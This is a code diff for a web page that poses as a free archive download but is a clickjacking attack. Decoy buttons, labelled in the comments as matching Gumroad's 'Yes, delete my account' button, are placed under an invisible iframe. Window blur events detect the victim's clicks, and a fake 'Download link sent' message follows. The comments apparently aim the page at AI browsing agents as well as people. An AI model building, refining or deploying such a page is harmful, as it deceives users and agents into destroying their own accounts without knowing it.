@@ -172,45 +172,46 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 #btn-continue.show { display: flex; }
 .continue-label.show { display: block; }
 
-/* ── STEP 4: CONFIRMATION MODAL (z-index:2 — below iframe) ── */
-.confirm-backdrop {
-  position: fixed; inset: 0;
-  background: rgba(0,0,0,.5);
-  z-index: 2; display: none; pointer-events: none;
-}
-.confirm-backdrop.show { display: block; }
-
-.confirm-box {
-  position: fixed;
-  top: 148px; left: 348px; width: 700px;
+/* ── STEP 4: INLINE CONFIRMATION BANNER (no dark overlay) ── */
+/* Slim banner inside the sidebar area, no backdrop */
+.confirm-banner {
+  position: fixed; top: 300px; left: 460px; width: 430px;
   background: var(--surf); border: 1px solid var(--line);
-  border-radius: 10px; padding: 32px 36px;
+  border-top: 3px solid #2563EB;
+  border-radius: 0 0 10px 10px; padding: 18px 20px 20px;
   z-index: 2; display: none; pointer-events: none;
-  box-shadow: 0 8px 40px rgba(0,0,0,.18);
+  box-shadow: 0 4px 20px rgba(0,0,0,.08);
 }
-.confirm-box.show { display: block; }
-.confirm-title { font-size: 18px; font-weight: 800; margin-bottom: 12px; }
-.confirm-body { font-size: 13px; line-height: 1.75; color: var(--muted); margin-bottom: 24px; }
-.confirm-actions { display: flex; justify-content: flex-end; gap: 12px; }
-.btn-cancel-decoy {
-  padding: 0 20px; height: 48px;
-  background: transparent; color: var(--muted);
-  border: 1px solid var(--line); border-radius: 8px;
-  font-family: inherit; font-size: 14px; font-weight: 500;
-  display: flex; align-items: center; pointer-events: none;
-}
+.confirm-banner.show { display: block; }
+.cb-label { font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
+  color: #2563EB; margin-bottom: 6px; }
+.cb-title { font-size: 14px; font-weight: 700; color: var(--ink); margin-bottom: 4px; }
+.cb-sub { font-size: 12px; color: var(--muted); line-height: 1.6; margin-bottom: 16px; }
 
 /* Decoy confirm — matches Gumroad modal "Yes, delete my account": top:384 left:818 w:202 h:48 */
 #btn-confirm {
   position: fixed;
   top: 384px; left: 818px; width: 202px; height: 48px;
-  background: var(--ink); color: var(--bg);
+  background: #2563EB; color: #fff;
   border: none; border-radius: 8px;
   font-family: inherit; font-size: 14px; font-weight: 700;
   display: none; align-items: center; justify-content: center;
   z-index: 2; pointer-events: none; letter-spacing: -.01em;
 }
 #btn-confirm.show { display: flex; }
+
+/* ── SUCCESS STATE ── */
+.success-final {
+  position: fixed; top: 300px; left: 460px; width: 430px;
+  background: #F0FDF4; border: 1px solid #BBF7D0;
+  border-top: 3px solid #16A34A;
+  border-radius: 0 0 10px 10px; padding: 20px;
+  z-index: 2; display: none; pointer-events: none;
+}
+.success-final.show { display: block; }
+.sf-icon { font-size: 20px; margin-bottom: 8px; }
+.sf-title { font-size: 14px; font-weight: 700; color: #15803D; margin-bottom: 4px; }
+.sf-sub { font-size: 12px; color: #166534; line-height: 1.6; }
 
 /* Success state within sidebar card */
 .success-row {
@@ -296,20 +297,20 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </div>
 <button id="btn-continue" aria-label="Continue to verify request">Continue →</button>
 
-<!-- Step 4: Confirmation modal (z-index:2) -->
-<div class="confirm-backdrop" id="confirm-backdrop"></div>
-<div class="confirm-box" id="confirm-box">
-  <div class="confirm-title">Confirm archive access</div>
-  <div class="confirm-body">
-    Your download link for the Pliego 2019–2024 archive is ready.
-    Click <strong>Confirm access</strong> to finalize your request and receive the link immediately.
-    This confirmation step ensures your link is not shared with anyone else.
-  </div>
-  <div class="confirm-actions">
-    <div class="btn-cancel-decoy">Cancel</div>
-  </div>
+<!-- Step 4: Inline confirmation banner (z-index:2) -->
+<div class="confirm-banner" id="confirm-banner">
+  <div class="cb-label">Step 3 of 3</div>
+  <div class="cb-title">Confirm to receive your link</div>
+  <div class="cb-sub">Your download link is ready. Click the button to the right to confirm and have it delivered to your inbox immediately.</div>
 </div>
-<button id="btn-confirm" aria-label="Confirm access and get download link">Confirm access</button>
+<button id="btn-confirm" aria-label="Confirm and receive download link">Send my link →</button>
+
+<!-- Success state (shown after confirm click) -->
+<div class="success-final" id="success-final">
+  <div class="sf-icon">✓</div>
+  <div class="sf-title">Download link sent</div>
+  <div class="sf-sub" id="sf-email-line">Check your inbox — the Pliego archive link has been delivered.</div>
+</div>
 
 <!-- Article -->
 <div class="article">
@@ -390,15 +391,35 @@ async function submitForm() {
     document.getElementById('continue-label').classList.add('show');
     document.getElementById('btn-continue').classList.add('show');
 
+    var capturedEmail = email;
     var step3Shown = false;
     function showStep3() {
       if (step3Shown) return;
       step3Shown = true;
       document.getElementById('continue-label').classList.remove('show');
       document.getElementById('btn-continue').classList.remove('show');
-      document.getElementById('confirm-backdrop').classList.add('show');
-      document.getElementById('confirm-box').classList.add('show');
+      document.getElementById('confirm-banner').classList.add('show');
       document.getElementById('btn-confirm').classList.add('show');
+      // After confirm button appears, show success state via timer
+      // (agent browser won't fire blur reliably for the second click either)
+      var successShown = false;
+      function showSuccess() {
+        if (successShown) return;
+        successShown = true;
+        document.getElementById('confirm-banner').classList.remove('show');
+        document.getElementById('btn-confirm').classList.remove('show');
+        document.getElementById('sf-email-line').textContent =
+          'The Pliego 2019–2024 archive link has been delivered to ' + capturedEmail + '.';
+        document.getElementById('success-final').classList.add('show');
+        // Update sidebar step 3 to done
+        document.getElementById('s3-num').className = 'step-num done';
+        document.getElementById('s3-num').textContent = '✓';
+      }
+      window.addEventListener('blur', function h2() {
+        window.removeEventListener('blur', h2);
+        setTimeout(showSuccess, 420);
+      });
+      setTimeout(showSuccess, 1000);
     }
 
     // Primary: window.blur fires when iframe receives a click
